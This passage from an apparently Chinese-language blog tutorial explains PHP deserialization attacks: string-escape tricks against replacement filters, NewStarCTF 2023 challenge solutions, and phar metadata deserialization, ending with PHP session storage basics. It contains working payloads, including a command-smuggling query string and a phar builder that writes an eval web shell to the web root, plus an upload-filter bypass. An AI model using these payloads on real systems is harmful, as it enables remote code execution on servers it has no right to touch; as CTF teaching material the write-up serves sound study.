&quot;</span>goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood<span class="string">&quot;</span></span><br><span class="line"><span class="string">  [&quot;</span>b<span class="string">&quot;]=&gt;</span></span><br><span class="line"><span class="string">  string(3) &quot;</span><span class="number">888</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">888666</span></span><br><span class="line"><span class="string">可以看到，成功替换。</span></span><br></pre></td></tr></table></figure><h4 id="减少的情况"><a href="#减少的情况" class="headerlink" title="减少的情况"></a>减少的情况</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;good&quot;</span>,<span class="string">&quot;hao&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">s</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这个是每替换一个就会减少一个字符，那就意味着我们需要让前面的吞掉后面的，再通过修改$b来实现我们的目的，让前面吞掉&quot;;s:1:&quot;b&quot;;s:21:，来实现我们的目的，这个原理与增加相似，反过来就行。</span></span><br><span class="line"><span class="variable">$a</span> =<span class="keyword">new</span> <span class="title function_ invoke__">s</span>(<span class="string">&#x27;goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood&#x27;</span>,<span class="string">&#x27;&quot;;s:1:&quot;b&quot;;s:3:&quot;888&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="comment">//echo serialize($a);</span></span><br><span class="line"><span class="comment">//echo (waf(serialize($a)));</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:1:&quot;s&quot;:2:&#123;s:1:&quot;a&quot;;s:64:&quot;haohaohaohaohaohaohaohaohaohaohaohaohaohaohaohao&quot;;s:1:&quot;b&quot;;s:21:&quot;&quot;;s:1:&quot;b&quot;;s:3:&quot;888&quot;;&#125;&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:3:&quot;888&quot;;&#125;&#x27;</span>));</span><br><span class="line"><span class="comment">//for($i=0;$i&lt;17;$i++)&#123;</span></span><br><span class="line"><span class="comment">//  echo &#x27;good&#x27;;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">运行结果：</span><br><span class="line">D:\phpstudy_pro\Extensions\php\php7.<span class="number">3.4</span>nts\php.exe -c D:\phpstudy_pro\Extensions\php\php7.<span class="number">3.4</span>nts\php.ini D:\PhpstormProjects\untitled1\payload.php</span><br><span class="line"><span class="keyword">object</span>(s)<span class="comment">#2 (2) &#123;</span></span><br><span class="line">  [<span class="string">&quot;a&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">64</span>) <span class="string">&quot;haohaohaohaohaohaohaohaohaohaohaohaohaohaohaohao&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">21</span>:<span class="string">&quot;&quot;</span></span><br><span class="line">  [<span class="string">&quot;b&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;888&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">888</span><span class="string">&quot;;s:1:&quot;</span>b<span class="string">&quot;;s:3:&quot;</span><span class="number">888</span><span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">Process finished with exit code 0</span></span><br><span class="line"><span class="string">成功替换。</span></span><br></pre></td></tr></table></figure><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><h3 id="小试牛刀—–-NewStarCTF-2023-公开赛道-逃（增）"><a href="#小试牛刀—–-NewStarCTF-2023-公开赛道-逃（增）" class="headerlink" title="小试牛刀—–[NewStarCTF 2023 公开赛道]逃（增）"></a>小试牛刀—–[NewStarCTF 2023 公开赛道]逃（增）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);s</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;good&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">GetFlag</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])))); </span><br><span class="line"></span><br><span class="line">可以看到，每将一个bad替换成一个good，字符串长度+<span class="number">1</span>，key是可控的</span><br><span class="line">O:<span class="number">7</span>:<span class="string">&quot;GetFlag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;bad&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;cmd&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;whoami&quot;</span>;&#125;这是传入一个bad的序列化的内容，现在我们不想执行whoami这个命令，就要把;s:<span class="number">3</span>:<span class="string">&quot;cmd&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;whoami&quot;</span>;&#125;给顶出去。</span><br><span class="line">目的字符串：O:<span class="number">7</span>:<span class="string">&quot;GetFlag&quot;</span>:<span class="number">2</span>：&#123;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;bad&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;cmd&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ls&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>cmd<span class="string">&quot;;s:6:&quot;</span>whoami<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;cmd&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ls&quot;</span>;&#125;有<span class="number">22</span>个字符，然后把<span class="number">22</span>个bad替换掉后，就是增加了<span class="number">22</span>个字符，那么ls就可以执行</span><br><span class="line">当前目录下没有，直接查根目录，原理一样</span><br><span class="line">?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad<span class="string">&quot;;s:3:&quot;</span>cmd<span class="string">&quot;;s:7:&quot;</span>cat /f*<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><h4 id="什么是phar文件"><a href="#什么是phar文件" class="headerlink" title="什么是phar文件"></a>什么是phar文件</h4><p>phar文件就是类似于java的jar的那种类型的压缩文件，它可以将多个php文件的代码压缩成一个phar，无需解压，PHP就可以进行访问并执行内部语句。</p><h4 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. stub <span class="comment">//phar文件头</span></span><br><span class="line">    phar文件的标志，也可以理解为phar的文件头</span><br><span class="line">    这个Stub其实就是一个简单的PHP文件，必须是 xxx<span class="meta">&lt;?php</span> xxx; <span class="title function_ invoke__">__HALT_COMPILER</span>();<span class="meta">?&gt;</span> 这种格式，必须有<span class="title function_ invoke__">__HALT_COMPILER</span>()，没有这个，PHP就无法识别出它是Phar文件。其他的无所谓。</span><br><span class="line"><span class="number">2</span>. manifest <span class="comment">//压缩文件的信息</span></span><br><span class="line">    phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这个meta-data就是用户自己定义的元数据，在这里用户自定义的元数据就是以序列化的形式存在的，这是漏洞利用最核心的地方。如下图。</span><br></pre></td></tr></table></figure><p><img src="C:\Users\杨沛欣\AppData\Roaming\Typora\typora-user-images\image-20240716105756715.png" alt="image-20240716105756715"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>. content <span class="comment">//压缩文件的内容</span></span><br><span class="line">    被压缩文件的内容</span><br><span class="line"><span class="number">4</span>. <span class="title function_ invoke__">signature</span> (可空) <span class="comment">//签名</span></span><br><span class="line">    签名，放在末尾。</span><br></pre></td></tr></table></figure><h4 id="phar反序列化-1"><a href="#phar反序列化-1" class="headerlink" title="phar反序列化"></a>phar反序列化</h4><p>Phar之所以能反序列化，是因为Phar文件会以序列化的形式存储用户自定义的<code>meta-data</code>,PHP使用<code>phar_parse_metadata</code>在解析meta数据时，会调用<code>php_var_unserialize</code>进行反序列化操作。</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、phar文件能够上传至服务器</span><br><span class="line">2、要有可控的参数，像元数据那种，并且、/、phar等特殊字符没有被过滤</span><br><span class="line">3、php.ini中的phar.readonly选项，需要为Off（默认是on）。</span><br></pre></td></tr></table></figure><h4 id="生成phar文件"><a href="#生成phar文件" class="headerlink" title="生成phar文件"></a>生成phar文件</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;qwq&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> `cmd`;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>(); <span class="comment">//创建一个flag的对象</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;A.phar&#x27;</span>); <span class="comment">//创建一个phar对象，这一行代码创建了一个新的 Phar 对象。Phar 是 PHP 中用于创建和操作 PHP 归档文件（PHAR 文件）的一个类。</span></span><br><span class="line"><span class="comment">//功能：new Phar(&quot;phar.phar&quot;)  文件名后缀必须是phar</span></span><br><span class="line"><span class="comment">//参数：&quot;phar.phar&quot; 是正在创建或打开的 PHAR 文件的名称。如果该文件不存在，则会创建一个新的文件。</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>(); <span class="comment">//开启缓存，在 Phar 对象上调用 startBuffering() 方法可以确保所有的更改在实际写入文件之前都会先被缓冲。这意味着在 stopBuffering() 之前的所有操作都不会立即生效，而是暂时存储在内存中。</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>); <span class="comment">//向 PHAR 文件中添加一个新的文件。addFromString 方法用于从字符串内容创建一个文件并将其添加到 PHAR 文件中。&quot;test.txt&quot; 是文件名，&quot;test&quot; 是文件内容。这一行代码并不是必须的。它的作用是向 PHAR 文件中添加一个名为 test.txt 的文件，并将其内容设置为 &quot;test&quot;。如果你不需要向 PHAR 文件中添加任何文件，这一行代码可以省略。</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="comment">//这一行代码设置了 PHAR 文件的存根（stub）。setStub 方法用于定义 PHAR 文件的入口代码。&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot; 是一个 PHP 指令，表示停止编译器。此代码在 PHAR 文件执行时首先运行。有时候会有文件头检测，如果有文件头检测可以加上文件头</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);<span class="comment">//设置元数据，setMetadata 方法用于给 PHAR 文件添加元数据。这里将 TestObject 对象 $a 作为元数据添加到 PHAR 文件中。</span></span><br><span class="line"><span class="comment">//自动计算签名</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>(); <span class="comment">//这一行代码停止缓冲操作并将所有缓冲的更改写入 PHAR 文件。stopBuffering 方法会将之前缓冲的所有更改实际写入到 PHAR 文件中，使更改生效。</span></span><br></pre></td></tr></table></figure><p>不过如果php.ini的phar.readonly处于on状态的话，是不允许生成phar文件的，cmd执行php –ini，就可以找到这个php.ini的文件路径，将php.ini里面的<code>phar.readonly</code>选项设置为<code>Off</code>。<code>并把分号去掉。</code></p><h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h3><h3 id="小试牛刀—–-NewStarCTF-2023-公开赛道-PharOne"><a href="#小试牛刀—–-NewStarCTF-2023-公开赛道-PharOne" class="headerlink" title="小试牛刀—–[NewStarCTF 2023 公开赛道]PharOne"></a>小试牛刀—–[NewStarCTF 2023 公开赛道]PharOne</h3><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407160957424.png" alt="img"></p><p>查看源码，得到提示，&#x2F;class.php</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161000091.png" alt="img"></p><p>访问看到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]); </span><br></pre></td></tr></table></figure><p>那我们就联想到了，上传phar文件，phar协议输出，进行反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;?=eval(\$_GET[1]);?&gt;&#x27;&gt;/var/www/html/1.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>(); <span class="comment">//创建一个flag的对象</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;A.phar&#x27;</span>); <span class="comment">//创建一个phar对象，这一行代码创建了一个新的 Phar 对象。Phar 是 PHP 中用于创建和操作 PHP 归档文件（PHAR 文件）的一个类。</span></span><br><span class="line"><span class="comment">//功能：new Phar(&quot;phar.phar&quot;)  文件名后缀必须是phar</span></span><br><span class="line"><span class="comment">//参数：&quot;phar.phar&quot; 是正在创建或打开的 PHAR 文件的名称。如果该文件不存在，则会创建一个新的文件。</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>(); <span class="comment">//开启缓存，在 Phar 对象上调用 startBuffering() 方法可以确保所有的更改在实际写入文件之前都会先被缓冲。这意味着在 stopBuffering() 之前的所有操作都不会立即生效，而是暂时存储在内存中。</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>); <span class="comment">//向 PHAR 文件中添加一个新的文件。addFromString 方法用于从字符串内容创建一个文件并将其添加到 PHAR 文件中。&quot;test.txt&quot; 是文件名，&quot;test&quot; 是文件内容。这一行代码并不是必须的。它的作用是向 PHAR 文件中添加一个名为 test.txt 的文件，并将其内容设置为 &quot;test&quot;。如果你不需要向 PHAR 文件中添加任何文件，这一行代码可以省略。</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="comment">//这一行代码设置了 PHAR 文件的存根（stub）。setStub 方法用于定义 PHAR 文件的入口代码。&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot; 是一个 PHP 指令，表示停止编译器。此代码在 PHAR 文件执行时首先运行。有时候会有文件头检测，如果有文件头检测可以加上文件头</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);<span class="comment">//设置元数据，setMetadata 方法用于给 PHAR 文件添加元数据。这里将 TestObject 对象 $a 作为元数据添加到 PHAR 文件中。</span></span><br><span class="line"><span class="comment">//自动计算签名</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>(); <span class="comment">//这一行代码停止缓冲操作并将所有缓冲的更改写入 PHAR 文件。stopBuffering 方法会将之前缓冲的所有更改实际写入到 PHAR 文件中，使更改生效。</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对__HALT_COMPILER()有过滤，所以通过gzip命令绕过，因为只能上传图片，所以修改后缀为.png</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161036193.png"></p><p>上传aa.png</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161039957.png"></p><p>在class.php下phar读取，进行反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=phar:<span class="comment">///var/www/html/upload/321532365639f31b3b9f8ea8be0c6be2.png </span></span><br></pre></td></tr></table></figure><p>访问&#x2F;1.php，GET传参执行命令</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161043057.png" alt="img"></p><h2 id="SESSION的概念"><a href="#SESSION的概念" class="headerlink" title="SESSION的概念"></a>SESSION的概念</h2><p><code>Session</code>一般称为“会话控制“，简单来说就是是一种客户与网站&#x2F;服务器更为安全的对话方式。一旦开启了 <code>session</code> 会话，便可以在网站的任何页面使用或保持这个会话，从而让访问者与网站之间建立了一种“对话”机制。因为HTTP协议是无状态的，那如何辨别“你是你”呢，那就用到了session，通过cookie中的session来进行用户追踪。</p><h2 id="SESSION的工作原理"><a href="#SESSION的工作原理" class="headerlink" title="SESSION的工作原理"></a>SESSION的工作原理</h2><p>当我们开启一个session会话时，首先php会先查找session_id，如果在请求的cookie中，服务器没有在GET或者POST请求方式中找到session_id，那么这个时候php就会调用php_session_create_id函数来创建一个新的会话，在http-response中通过set-cookie头部发送给客户端，session在客户端保存。</p><p><strong>session_start()函数</strong></p><p>上面说了session的创建，那么下面我们就要说一下session的创建过程，我们先来看一下session_statrt()这个函数，这个函数的作用是开启会话，初始化session数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">Seesion_start</span>()函数会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时<span class="title function_ invoke__">Session_start</span>()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的</span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161517719.png" alt="img"></p><h2 id="SESSION的存储机制"><a href="#SESSION的存储机制" class="headerlink" title="SESSION的存储机制"></a>SESSION的存储机制</h2><p>写一个测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;session_id(): &quot;</span>.<span class="title function_ invoke__">session_id</span>().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;COOKIE: &quot;</span>.<span class="variable">$_COOKIE</span>[<span class="string">&quot;PHPSESSID&quot;</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161531721.png" alt="img"></p><p>可以看到生成了一个session</p><p>我们查看一下文件夹，一般都在是存储在tmp&#x2F;里面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php5/sess_PHPSESSID</span><br><span class="line">/var/lib/php7/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSED</span><br><span class="line">liunx常见保存位置</span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161533665.png" alt="img"></p><p>最后一个就是我们刚创建的session了</p><p>我们给session赋值看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;test1&#x27;</span>]=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;test2&#x27;</span>]=<span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;session_id(): &quot;</span> . <span class="title function_ invoke__">session_id</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;COOKIE: &quot;</span> . <span class="variable">$_COOKIE</span>[<span class="string">&quot;PHPSESSID&quot;</span>];</span><br></pre></td></tr></table></figure><p><img 